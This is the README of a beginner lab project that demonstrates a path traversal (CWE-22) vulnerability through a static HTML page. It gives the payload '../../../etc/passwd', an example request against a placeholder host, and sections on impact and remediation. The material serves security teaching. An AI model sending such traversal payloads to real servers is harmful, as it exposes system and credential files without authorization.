# Lab-File-path-traversal-simple-case-APPRENTICE
# Path Traversal Vulnerability - Proof of Concept

## Overview

This project demonstrates a basic Proof of Concept (PoC) for a Directory Traversal (Path Traversal) vulnerability using HTML, CSS, and JavaScript.

The page simulates how attackers manipulate file path parameters to access sensitive server files outside the intended web directory.

---

# Vulnerability Details

## Vulnerability Type

* Directory Traversal
* Path Traversal

## CWE

* CWE-22

---

# Affected Endpoint Example

```http
GET /image?filename=21.jpg HTTP/2
```

---

# Payload Used

```bash
../../../etc/passwd
```

---

# Exploit Example

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: vulnerable-target.com
```

---

# Features

* Modern responsive UI
* Vulnerability explanation
* Payload demonstration
* Simulated vulnerable response
* Impact section
* Remediation section
* Interactive JavaScript button

---

# Technologies Used

* HTML5
* CSS3
* JavaScript

---

# Project Structure

```bash
project/
│
├── index.html
└── README.md
```

---

# How to Run

1. Download the project files.
2. Open `index.html` in any browser.
3. Click on:

   * "Show Vulnerable Response"

---

# Impact

Successful exploitation may lead to:

* Sensitive file disclosure
* Credential leakage
* Source code exposure
* Configuration disclosure

---

# Remediation

* Validate user input
* Prevent directory traversal sequences
* Use allowlisted filenames
* Restrict filesystem permissions
* Use secure file handling methods

---

# Educational Purpose Only

This project is created strictly for:

* Security research
* Ethical hacking practice
* CTF labs
* Learning web security

Do NOT use these techniques on unauthorized systems.

---

# Author

Security Research Practice Project
